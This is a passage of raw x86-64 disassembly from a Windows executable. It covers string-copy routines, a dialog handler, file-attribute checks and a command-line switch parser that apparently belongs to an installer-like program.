   14000654c:	48 8b cb             	mov    %rbx,%rcx
   14000654f:	48 ff c1             	inc    %rcx
   140006552:	80 3c 0e 00          	cmpb   $0x0,(%rsi,%rcx,1)
   140006556:	75 f7                	jne    0x14000654f
   140006558:	48 83 c0 64          	add    $0x64,%rax
   14000655c:	48 03 c1             	add    %rcx,%rax
   14000655f:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006564:	8b d0                	mov    %eax,%edx
   140006566:	44 8b f0             	mov    %eax,%r14d
   140006569:	48 ff 15 50 4f 00 00 	rex.W call *0x4f50(%rip)        # 0x14000b4c0
   140006570:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006575:	48 8b f8             	mov    %rax,%rdi
   140006578:	48 85 c0             	test   %rax,%rax
   14000657b:	74 34                	je     0x1400065b1
   14000657d:	4c 8b ce             	mov    %rsi,%r9
   140006580:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140006585:	41 8b d6             	mov    %r14d,%edx
   140006588:	48 8b c8             	mov    %rax,%rcx
   14000658b:	e8 b8 d2 ff ff       	call   0x140003848
   140006590:	eb 71                	jmp    0x140006603
   140006592:	ff c0                	inc    %eax
   140006594:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006599:	8b d0                	mov    %eax,%edx
   14000659b:	8b f0                	mov    %eax,%esi
   14000659d:	48 ff 15 1c 4f 00 00 	rex.W call *0x4f1c(%rip)        # 0x14000b4c0
   1400065a4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400065a9:	48 8b f8             	mov    %rax,%rdi
   1400065ac:	48 85 c0             	test   %rax,%rax
   1400065af:	75 07                	jne    0x1400065b8
   1400065b1:	8b c3                	mov    %ebx,%eax
   1400065b3:	e9 bd 00 00 00       	jmp    0x140006675
   1400065b8:	48 85 f6             	test   %rsi,%rsi
   1400065bb:	74 46                	je     0x140006603
   1400065bd:	48 81 fe ff ff ff 7f 	cmp    $0x7fffffff,%rsi
   1400065c4:	77 3a                	ja     0x140006600
   1400065c6:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
   1400065cb:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400065d0:	48 2b d6             	sub    %rsi,%rdx
   1400065d3:	48 8b c8             	mov    %rax,%rcx
   1400065d6:	4c 2b c0             	sub    %rax,%r8
   1400065d9:	48 8d 04 32          	lea    (%rdx,%rsi,1),%rax
   1400065dd:	48 85 c0             	test   %rax,%rax
   1400065e0:	74 13                	je     0x1400065f5
   1400065e2:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400065e6:	84 c0                	test   %al,%al
   1400065e8:	74 0b                	je     0x1400065f5
   1400065ea:	88 01                	mov    %al,(%rcx)
   1400065ec:	48 ff c1             	inc    %rcx
   1400065ef:	48 83 ee 01          	sub    $0x1,%rsi
   1400065f3:	75 e4                	jne    0x1400065d9
   1400065f5:	48 85 f6             	test   %rsi,%rsi
   1400065f8:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400065fc:	48 0f 45 c1          	cmovne %rcx,%rax
   140006600:	c6 00 00             	movb   $0x0,(%rax)
   140006603:	8b 8d e0 01 00 00    	mov    0x1e0(%rbp),%ecx
   140006609:	48 ff 15 d0 4f 00 00 	rex.W call *0x4fd0(%rip)        # 0x14000b5e0
   140006610:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006615:	e8 06 33 00 00       	call   0x140009920
   14000661a:	85 c0                	test   %eax,%eax
   14000661c:	74 0f                	je     0x14000662d
   14000661e:	e8 21 32 00 00       	call   0x140009844
   140006623:	41 b9 00 00 19 00    	mov    $0x190000,%r9d
   140006629:	85 c0                	test   %eax,%eax
   14000662b:	75 06                	jne    0x140006633
   14000662d:	41 b9 00 00 01 00    	mov    $0x10000,%r9d
   140006633:	44 0b 8d e0 01 00 00 	or     0x1e0(%rbp),%r9d
   14000663a:	4c 8d 05 77 90 00 00 	lea    0x9077(%rip),%r8        # 0x14000f6b8
   140006641:	44 0b 8d e8 01 00 00 	or     0x1e8(%rbp),%r9d
   140006648:	48 8b d7             	mov    %rdi,%rdx
   14000664b:	49 8b cc             	mov    %r12,%rcx
   14000664e:	48 ff 15 fb 4f 00 00 	rex.W call *0x4ffb(%rip)        # 0x14000b650
   140006655:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000665a:	48 8b cf             	mov    %rdi,%rcx
   14000665d:	8b d8                	mov    %eax,%ebx
   14000665f:	48 ff 15 f2 4c 00 00 	rex.W call *0x4cf2(%rip)        # 0x14000b358
   140006666:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000666b:	e9 41 ff ff ff       	jmp    0x1400065b1
   140006670:	b8 01 00 00 00       	mov    $0x1,%eax
   140006675:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   14000667c:	48 33 cc             	xor    %rsp,%rcx
   14000667f:	e8 2c 35 00 00       	call   0x140009bb0
   140006684:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   14000668b:	41 5f                	pop    %r15
   14000668d:	41 5e                	pop    %r14
   14000668f:	41 5c                	pop    %r12
   140006691:	5f                   	pop    %rdi
   140006692:	5e                   	pop    %rsi
   140006693:	5b                   	pop    %rbx
   140006694:	5d                   	pop    %rbp
   140006695:	c3                   	ret
   140006696:	cc                   	int3
   140006697:	cc                   	int3
   140006698:	cc                   	int3
   140006699:	cc                   	int3
   14000669a:	cc                   	int3
   14000669b:	cc                   	int3
   14000669c:	cc                   	int3
   14000669d:	cc                   	int3
   14000669e:	cc                   	int3
   14000669f:	cc                   	int3
   1400066a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400066a5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400066aa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400066af:	57                   	push   %rdi
   1400066b0:	48 83 ec 30          	sub    $0x30,%rsp
   1400066b4:	48 8b 1d f5 98 00 00 	mov    0x98f5(%rip),%rbx        # 0x14000ffb0
   1400066bb:	49 8b e8             	mov    %r8,%rbp
   1400066be:	48 8b cb             	mov    %rbx,%rcx
   1400066c1:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   1400066c7:	49 8b f1             	mov    %r9,%rsi
   1400066ca:	48 ff 15 07 4d 00 00 	rex.W call *0x4d07(%rip)        # 0x14000b3d8
   1400066d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400066d6:	48 85 c0             	test   %rax,%rax
   1400066d9:	74 60                	je     0x14000673b
   1400066db:	48 8b d0             	mov    %rax,%rdx
   1400066de:	48 8b cb             	mov    %rbx,%rcx
   1400066e1:	48 ff 15 80 4d 00 00 	rex.W call *0x4d80(%rip)        # 0x14000b468
   1400066e8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400066ed:	48 8b f8             	mov    %rax,%rdi
   1400066f0:	48 85 c0             	test   %rax,%rax
   1400066f3:	74 46                	je     0x14000673b
   1400066f5:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1400066fa:	4c 8b ce             	mov    %rsi,%r9
   1400066fd:	4c 8b c5             	mov    %rbp,%r8
   140006700:	48 8b d7             	mov    %rdi,%rdx
   140006703:	48 8b cb             	mov    %rbx,%rcx
   140006706:	48 85 c0             	test   %rax,%rax
   140006709:	75 07                	jne    0x140006712
   14000670b:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140006710:	eb 05                	jmp    0x140006717
   140006712:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006717:	48 ff 15 9a 4e 00 00 	rex.W call *0x4e9a(%rip)        # 0x14000b5b8
   14000671e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006723:	48 8b cf             	mov    %rdi,%rcx
   140006726:	48 8b d8             	mov    %rax,%rbx
   140006729:	48 ff 15 d0 4c 00 00 	rex.W call *0x4cd0(%rip)        # 0x14000b400
   140006730:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006735:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006739:	75 24                	jne    0x14000675f
   14000673b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140006740:	45 33 c9             	xor    %r9d,%r9d
   140006743:	45 33 c0             	xor    %r8d,%r8d
   140006746:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000674d:	00 
   14000674e:	ba fb 04 00 00       	mov    $0x4fb,%edx
   140006753:	33 c9                	xor    %ecx,%ecx
   140006755:	e8 7e fc ff ff       	call   0x1400063d8
   14000675a:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000675f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006764:	48 8b c3             	mov    %rbx,%rax
   140006767:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000676c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006771:	48 83 c4 30          	add    $0x30,%rsp
   140006775:	5f                   	pop    %rdi
   140006776:	c3                   	ret
   140006777:	cc                   	int3
   140006778:	cc                   	int3
   140006779:	cc                   	int3
   14000677a:	cc                   	int3
   14000677b:	cc                   	int3
   14000677c:	cc                   	int3
   14000677d:	cc                   	int3
   14000677e:	cc                   	int3
   14000677f:	cc                   	int3
   140006780:	48 83 ec 28          	sub    $0x28,%rsp
   140006784:	48 ff 15 5d 4b 00 00 	rex.W call *0x4b5d(%rip)        # 0x14000b2e8
   14000678b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006790:	85 c0                	test   %eax,%eax
   140006792:	7e 08                	jle    0x14000679c
   140006794:	0f b7 c0             	movzwl %ax,%eax
   140006797:	0d 00 00 07 80       	or     $0x80070000,%eax
   14000679c:	48 83 c4 28          	add    $0x28,%rsp
   1400067a0:	c3                   	ret
   1400067a1:	cc                   	int3
   1400067a2:	cc                   	int3
   1400067a3:	cc                   	int3
   1400067a4:	cc                   	int3
   1400067a5:	cc                   	int3
   1400067a6:	cc                   	int3
   1400067a7:	cc                   	int3
   1400067a8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400067ad:	57                   	push   %rdi
   1400067ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400067b2:	48 8b fa             	mov    %rdx,%rdi
   1400067b5:	48 8d 0d 34 52 00 00 	lea    0x5234(%rip),%rcx        # 0x14000b9f0
   1400067bc:	33 d2                	xor    %edx,%edx
   1400067be:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1400067c4:	48 ff 15 dd 4c 00 00 	rex.W call *0x4cdd(%rip)        # 0x14000b4a8
   1400067cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400067d0:	48 8b d8             	mov    %rax,%rbx
   1400067d3:	48 85 c0             	test   %rax,%rax
   1400067d6:	74 2c                	je     0x140006804
   1400067d8:	48 8d 15 51 53 00 00 	lea    0x5351(%rip),%rdx        # 0x14000bb30
   1400067df:	48 8b c8             	mov    %rax,%rcx
   1400067e2:	48 ff 15 5f 4b 00 00 	rex.W call *0x4b5f(%rip)        # 0x14000b348
   1400067e9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400067ee:	48 85 c0             	test   %rax,%rax
   1400067f1:	74 11                	je     0x140006804
   1400067f3:	48 8b d7             	mov    %rdi,%rdx
   1400067f6:	b9 04 01 00 00       	mov    $0x104,%ecx
   1400067fb:	e8 10 38 00 00       	call   0x14000a010
   140006800:	8b f8                	mov    %eax,%edi
   140006802:	eb 1b                	jmp    0x14000681f
   140006804:	48 8b d7             	mov    %rdi,%rdx
   140006807:	b9 04 01 00 00       	mov    $0x104,%ecx
   14000680c:	48 ff 15 05 4c 00 00 	rex.W call *0x4c05(%rip)        # 0x14000b418
   140006813:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006818:	8b f8                	mov    %eax,%edi
   14000681a:	48 85 db             	test   %rbx,%rbx
   14000681d:	74 0f                	je     0x14000682e
   14000681f:	48 8b cb             	mov    %rbx,%rcx
   140006822:	48 ff 15 3f 4b 00 00 	rex.W call *0x4b3f(%rip)        # 0x14000b368
   140006829:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000682e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006833:	8b c7                	mov    %edi,%eax
   140006835:	48 83 c4 20          	add    $0x20,%rsp
   140006839:	5f                   	pop    %rdi
   14000683a:	c3                   	ret
   14000683b:	cc                   	int3
   14000683c:	cc                   	int3
   14000683d:	cc                   	int3
   14000683e:	cc                   	int3
   14000683f:	cc                   	int3
   140006840:	cc                   	int3
   140006841:	cc                   	int3
   140006842:	cc                   	int3
   140006843:	cc                   	int3
   140006844:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
   14000684b:	48 8b 05 2e 78 00 00 	mov    0x782e(%rip),%rax        # 0x14000e080
   140006852:	48 33 c4             	xor    %rsp,%rax
   140006855:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   14000685c:	00 
   14000685d:	ba 04 01 00 00       	mov    $0x104,%edx
   140006862:	4c 8d 0d e7 8e 00 00 	lea    0x8ee7(%rip),%r9        # 0x14000f750
   140006869:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000686e:	44 8b c2             	mov    %edx,%r8d
   140006871:	4c 2b c8             	sub    %rax,%r9
   140006874:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006879:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140006880:	48 85 c0             	test   %rax,%rax
   140006883:	74 13                	je     0x140006898
   140006885:	41 8a 04 09          	mov    (%r9,%rcx,1),%al
   140006889:	84 c0                	test   %al,%al
   14000688b:	74 0b                	je     0x140006898
   14000688d:	88 01                	mov    %al,(%rcx)
   14000688f:	48 ff c1             	inc    %rcx
   140006892:	49 83 e8 01          	sub    $0x1,%r8
   140006896:	75 e1                	jne    0x140006879
   140006898:	4d 85 c0             	test   %r8,%r8
   14000689b:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000689f:	4c 8d 05 32 50 00 00 	lea    0x5032(%rip),%r8        # 0x14000b8d8
   1400068a6:	48 0f 45 c1          	cmovne %rcx,%rax
   1400068aa:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400068af:	c6 00 00             	movb   $0x0,(%rax)
   1400068b2:	e8 25 2d 00 00       	call   0x1400095dc
   1400068b7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400068bc:	48 ff 15 2d 4a 00 00 	rex.W call *0x4a2d(%rip)        # 0x14000b2f0
   1400068c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400068c8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400068cb:	74 1d                	je     0x1400068ea
   1400068cd:	a8 10                	test   $0x10,%al
   1400068cf:	75 19                	jne    0x1400068ea
   1400068d1:	33 d2                	xor    %edx,%edx
   1400068d3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400068d8:	44 8d 42 08          	lea    0x8(%rdx),%r8d
   1400068dc:	48 ff 15 95 4c 00 00 	rex.W call *0x4c95(%rip)        # 0x14000b578
   1400068e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400068e8:	eb 13                	jmp    0x1400068fd
   1400068ea:	48 8d 0d e7 4f 00 00 	lea    0x4fe7(%rip),%rcx        # 0x14000b8d8
   1400068f1:	48 ff 15 08 4a 00 00 	rex.W call *0x4a08(%rip)        # 0x14000b300
   1400068f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400068fd:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140006904:	00 
   140006905:	48 33 cc             	xor    %rsp,%rcx
   140006908:	e8 a3 32 00 00       	call   0x140009bb0
   14000690d:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   140006914:	c3                   	ret
   140006915:	cc                   	int3
   140006916:	cc                   	int3
   140006917:	cc                   	int3
   140006918:	cc                   	int3
   140006919:	cc                   	int3
   14000691a:	cc                   	int3
   14000691b:	cc                   	int3
   14000691c:	cc                   	int3
   14000691d:	cc                   	int3
   14000691e:	cc                   	int3
   14000691f:	cc                   	int3
   140006920:	40 57                	rex push %rdi
   140006922:	48 83 ec 20          	sub    $0x20,%rsp
   140006926:	48 8b f9             	mov    %rcx,%rdi
   140006929:	83 ea 10             	sub    $0x10,%edx
   14000692c:	0f 84 97 00 00 00    	je     0x1400069c9
   140006932:	81 ea 00 01 00 00    	sub    $0x100,%edx
   140006938:	74 36                	je     0x140006970
   14000693a:	83 fa 01             	cmp    $0x1,%edx
   14000693d:	74 07                	je     0x140006946
   14000693f:	33 c0                	xor    %eax,%eax
   140006941:	e9 99 00 00 00       	jmp    0x1400069df
   140006946:	49 8b c8             	mov    %r8,%rcx
   140006949:	48 83 e9 06          	sub    $0x6,%rcx
   14000694d:	74 19                	je     0x140006968
   14000694f:	48 83 e9 01          	sub    $0x1,%rcx
   140006953:	74 13                	je     0x140006968
   140006955:	48 81 f9 32 08 00 00 	cmp    $0x832,%rcx
   14000695c:	75 7c                	jne    0x1400069da
   14000695e:	c7 05 d8 8d 00 00 01 	movl   $0x1,0x8dd8(%rip)        # 0x14000f740
   140006965:	00 00 00 
   140006968:	49 8b d0             	mov    %r8,%rdx
   14000696b:	48 8b cf             	mov    %rdi,%rcx
   14000696e:	eb 5e                	jmp    0x1400069ce
   140006970:	48 ff 15 49 4c 00 00 	rex.W call *0x4c49(%rip)        # 0x14000b5c0
   140006977:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000697c:	48 8b d0             	mov    %rax,%rdx
   14000697f:	48 8b cf             	mov    %rdi,%rcx
   140006982:	e8 a1 d4 ff ff       	call   0x140003e28
   140006987:	48 8d 15 2a 8d 00 00 	lea    0x8d2a(%rip),%rdx        # 0x14000f6b8
   14000698e:	48 8b cf             	mov    %rdi,%rcx
   140006991:	48 ff 15 c0 4c 00 00 	rex.W call *0x4cc0(%rip)        # 0x14000b658
   140006998:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000699d:	4c 8b 05 cc 8f 00 00 	mov    0x8fcc(%rip),%r8        # 0x14000f970
   1400069a4:	ba 38 08 00 00       	mov    $0x838,%edx
   1400069a9:	48 8b cf             	mov    %rdi,%rcx
   1400069ac:	48 ff 15 1d 4c 00 00 	rex.W call *0x4c1d(%rip)        # 0x14000b5d0
   1400069b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400069b8:	48 8b cf             	mov    %rdi,%rcx
   1400069bb:	48 ff 15 56 4c 00 00 	rex.W call *0x4c56(%rip)        # 0x14000b618
   1400069c2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400069c7:	eb 11                	jmp    0x1400069da
   1400069c9:	ba 02 00 00 00       	mov    $0x2,%edx
   1400069ce:	48 ff 15 13 4c 00 00 	rex.W call *0x4c13(%rip)        # 0x14000b5e8
   1400069d5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400069da:	b8 01 00 00 00       	mov    $0x1,%eax
   1400069df:	48 83 c4 20          	add    $0x20,%rsp
   1400069e3:	5f                   	pop    %rdi
   1400069e4:	c3                   	ret
   1400069e5:	cc                   	int3
   1400069e6:	cc                   	int3
   1400069e7:	cc                   	int3
   1400069e8:	cc                   	int3
   1400069e9:	cc                   	int3
   1400069ea:	cc                   	int3
   1400069eb:	cc                   	int3
   1400069ec:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400069f1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400069f6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400069fb:	55                   	push   %rbp
   1400069fc:	41 54                	push   %r12
   1400069fe:	41 55                	push   %r13
   140006a00:	41 56                	push   %r14
   140006a02:	41 57                	push   %r15
   140006a04:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   140006a09:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140006a10:	48 8b 05 69 76 00 00 	mov    0x7669(%rip),%rax        # 0x14000e080
   140006a17:	48 33 c4             	xor    %rsp,%rax
   140006a1a:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140006a1e:	45 33 ff             	xor    %r15d,%r15d
   140006a21:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140006a27:	4c 8b f1             	mov    %rcx,%r14
   140006a2a:	41 8b f4             	mov    %r12d,%esi
   140006a2d:	48 85 c9             	test   %rcx,%rcx
   140006a30:	0f 84 f9 05 00 00    	je     0x14000702f
   140006a36:	44 38 39             	cmp    %r15b,(%rcx)
   140006a39:	0f 84 f0 05 00 00    	je     0x14000702f
   140006a3f:	41 8d 7c 24 01       	lea    0x1(%r12),%edi
   140006a44:	41 bd 04 01 00 00    	mov    $0x104,%r13d
   140006a4a:	48 8d 1d 0d 85 00 00 	lea    0x850d(%rip),%rbx        # 0x14000ef5e
   140006a51:	85 f6                	test   %esi,%esi
   140006a53:	0f 84 bf 00 00 00    	je     0x140006b18
   140006a59:	41 80 3e 20          	cmpb   $0x20,(%r14)
   140006a5d:	74 09                	je     0x140006a68
   140006a5f:	41 8a 06             	mov    (%r14),%al
   140006a62:	2c 09                	sub    $0x9,%al
   140006a64:	3c 04                	cmp    $0x4,%al
   140006a66:	77 14                	ja     0x140006a7c
   140006a68:	49 8b ce             	mov    %r14,%rcx
   140006a6b:	48 ff 15 8e 4b 00 00 	rex.W call *0x4b8e(%rip)        # 0x14000b600
   140006a72:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a77:	4c 8b f0             	mov    %rax,%r14
   140006a7a:	eb dd                	jmp    0x140006a59
   140006a7c:	45 38 3e             	cmp    %r15b,(%r14)
   140006a7f:	0f 84 93 00 00 00    	je     0x140006b18
   140006a85:	49 8b cf             	mov    %r15,%rcx
   140006a88:	45 8b c7             	mov    %r15d,%r8d
   140006a8b:	45 8b cf             	mov    %r15d,%r9d
   140006a8e:	41 8b d4             	mov    %r12d,%edx
   140006a91:	45 85 c0             	test   %r8d,%r8d
   140006a94:	75 0f                	jne    0x140006aa5
   140006a96:	41 8a 06             	mov    (%r14),%al
   140006a99:	3c 20                	cmp    $0x20,%al
   140006a9b:	74 60                	je     0x140006afd
   140006a9d:	2c 09                	sub    $0x9,%al
   140006a9f:	3c 04                	cmp    $0x4,%al
   140006aa1:	76 5a                	jbe    0x140006afd
   140006aa3:	eb 05                	jmp    0x140006aaa
   140006aa5:	45 85 c9             	test   %r9d,%r9d
   140006aa8:	75 53                	jne    0x140006afd
   140006aaa:	41 8a 06             	mov    (%r14),%al
   140006aad:	3c 22                	cmp    $0x22,%al
   140006aaf:	75 31                	jne    0x140006ae2
   140006ab1:	41 38 46 01          	cmp    %al,0x1(%r14)
   140006ab5:	74 12                	je     0x140006ac9
   140006ab7:	45 85 c0             	test   %r8d,%r8d
   140006aba:	75 05                	jne    0x140006ac1
   140006abc:	45 8b c4             	mov    %r12d,%r8d
   140006abf:	eb 03                	jmp    0x140006ac4
   140006ac1:	45 8b cc             	mov    %r12d,%r9d
   140006ac4:	49 ff c6             	inc    %r14
   140006ac7:	eb 2f                	jmp    0x140006af8
   140006ac9:	41 3b d5             	cmp    %r13d,%edx
   140006acc:	0f 83 1a 04 00 00    	jae    0x140006eec
   140006ad2:	c6 44 0c 40 22       	movb   $0x22,0x40(%rsp,%rcx,1)
   140006ad7:	41 03 d4             	add    %r12d,%edx
   140006ada:	49 03 cc             	add    %r12,%rcx
   140006add:	4c 03 f7             	add    %rdi,%r14
   140006ae0:	eb 16                	jmp    0x140006af8
   140006ae2:	41 3b d5             	cmp    %r13d,%edx
   140006ae5:	0f 83 01 04 00 00    	jae    0x140006eec
   140006aeb:	88 44 0c 40          	mov    %al,0x40(%rsp,%rcx,1)
   140006aef:	41 03 d4             	add    %r12d,%edx
   140006af2:	49 03 cc             	add    %r12,%rcx
   140006af5:	4d 03 f4             	add    %r12,%r14
   140006af8:	45 38 3e             	cmp    %r15b,(%r14)
   140006afb:	75 94                	jne    0x140006a91
   140006afd:	49 3b cd             	cmp    %r13,%rcx
   140006b00:	0f 83 5a 05 00 00    	jae    0x140007060
   140006b06:	44 88 7c 0c 40       	mov    %r15b,0x40(%rsp,%rcx,1)
   140006b0b:	45 85 c0             	test   %r8d,%r8d
   140006b0e:	74 59                	je     0x140006b69
   140006b10:	45 85 c9             	test   %r9d,%r9d
   140006b13:	75 59                	jne    0x140006b6e
   140006b15:	41 8b f7             	mov    %r15d,%esi
   140006b18:	44 39 3d 2d 83 00 00 	cmp    %r15d,0x832d(%rip)        # 0x14000ee4c
   140006b1f:	0f 84 06 05 00 00    	je     0x14000702b
   140006b25:	44 38 3d 32 84 00 00 	cmp    %r15b,0x8432(%rip)        # 0x14000ef5e
   140006b2c:	0f 85 f9 04 00 00    	jne    0x14000702b
   140006b32:	48 8b 0d 77 94 00 00 	mov    0x9477(%rip),%rcx        # 0x14000ffb0
   140006b39:	45 8b c5             	mov    %r13d,%r8d
   140006b3c:	48 8b d3             	mov    %rbx,%rdx
   140006b3f:	48 ff 15 2a 4a 00 00 	rex.W call *0x4a2a(%rip)        # 0x14000b570
   140006b46:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006b4b:	85 c0                	test   %eax,%eax
   140006b4d:	0f 84 d5 04 00 00    	je     0x140007028
   140006b53:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140006b58:	48 8b cb             	mov    %rbx,%rcx
   140006b5b:	e8 2c 2c 00 00       	call   0x14000978c
   140006b60:	44 88 78 01          	mov    %r15b,0x1(%rax)
   140006b64:	e9 c2 04 00 00       	jmp    0x14000702b
   140006b69:	45 85 c9             	test   %r9d,%r9d
   140006b6c:	75 a7                	jne    0x140006b15
   140006b6e:	8a 44 24 40          	mov    0x40(%rsp),%al
   140006b72:	2c 2d                	sub    $0x2d,%al
   140006b74:	a8 fd                	test   $0xfd,%al
   140006b76:	0f 85 70 03 00 00    	jne    0x140006eec
   140006b7c:	48 0f be 4c 24 41    	movsbq 0x41(%rsp),%rcx
   140006b82:	48 ff 15 3f 4a 00 00 	rex.W call *0x4a3f(%rip)        # 0x14000b5c8
   140006b89:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006b8e:	0f be c8             	movsbl %al,%ecx
   140006b91:	83 e9 3f             	sub    $0x3f,%ecx
   140006b94:	0f 84 62 04 00 00    	je     0x140006ffc
   140006b9a:	83 e9 04             	sub    $0x4,%ecx
   140006b9d:	0f 84 50 03 00 00    	je     0x140006ef3
   140006ba3:	41 2b cc             	sub    %r12d,%ecx
   140006ba6:	0f 84 db 01 00 00    	je     0x140006d87
   140006bac:	83 e9 0a             	sub    $0xa,%ecx
   140006baf:	0f 84 5c 01 00 00    	je     0x140006d11
   140006bb5:	83 e9 03             	sub    $0x3,%ecx
   140006bb8:	0f 84 07 01 00 00    	je     0x140006cc5
   140006bbe:	41 2b cc             	sub    %r12d,%ecx
   140006bc1:	74 19                	je     0x140006bdc
   140006bc3:	3b cf                	cmp    %edi,%ecx
   140006bc5:	0f 84 bc 01 00 00    	je     0x140006d87
   140006bcb:	41 8b f7             	mov    %r15d,%esi
   140006bce:	45 38 3e             	cmp    %r15b,(%r14)
   140006bd1:	0f 85 7a fe ff ff    	jne    0x140006a51
   140006bd7:	e9 3c ff ff ff       	jmp    0x140006b18
   140006bdc:	8a 44 24 42          	mov    0x42(%rsp),%al
   140006be0:	84 c0                	test   %al,%al
   140006be2:	75 13                	jne    0x140006bf7
   140006be4:	c7 05 ae 93 00 00 03 	movl   $0x3,0x93ae(%rip)        # 0x14000ff9c
   140006beb:	00 00 00 
   140006bee:	44 89 25 53 82 00 00 	mov    %r12d,0x8253(%rip)        # 0x14000ee48
   140006bf5:	eb d7                	jmp    0x140006bce
   140006bf7:	3c 3a                	cmp    $0x3a,%al
   140006bf9:	0f 85 8b 00 00 00    	jne    0x140006c8a
   140006bff:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140006c04:	44 89 25 91 93 00 00 	mov    %r12d,0x9391(%rip)        # 0x14000ff9c
   140006c0b:	84 c0                	test   %al,%al
   140006c0d:	74 bf                	je     0x140006bce
   140006c0f:	48 8d 5c 24 43       	lea    0x43(%rsp),%rbx
   140006c14:	48 0f be c8          	movsbq %al,%rcx
   140006c18:	48 ff 15 a9 49 00 00 	rex.W call *0x49a9(%rip)        # 0x14000b5c8
   140006c1f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c24:	49 03 dc             	add    %r12,%rbx
   140006c27:	3c 41                	cmp    $0x41,%al
   140006c29:	74 47                	je     0x140006c72
   140006c2b:	3c 44                	cmp    $0x44,%al
   140006c2d:	74 3a                	je     0x140006c69
   140006c2f:	3c 49                	cmp    $0x49,%al
   140006c31:	74 2d                	je     0x140006c60
   140006c33:	3c 4e                	cmp    $0x4e,%al
   140006c35:	74 20                	je     0x140006c57
   140006c37:	3c 50                	cmp    $0x50,%al
   140006c39:	74 12                	je     0x140006c4d
   140006c3b:	3c 53                	cmp    $0x53,%al
   140006c3d:	74 05                	je     0x140006c44
   140006c3f:	41 8b f7             	mov    %r15d,%esi
   140006c42:	eb 3b                	jmp    0x140006c7f
   140006c44:	83 0d 51 93 00 00 04 	orl    $0x4,0x9351(%rip)        # 0x14000ff9c
   140006c4b:	eb 2b                	jmp    0x140006c78
   140006c4d:	0f ba 2d 13 85 00 00 	btsl   $0x7,0x8513(%rip)        # 0x14000f168
   140006c54:	07 
   140006c55:	eb 28                	jmp    0x140006c7f
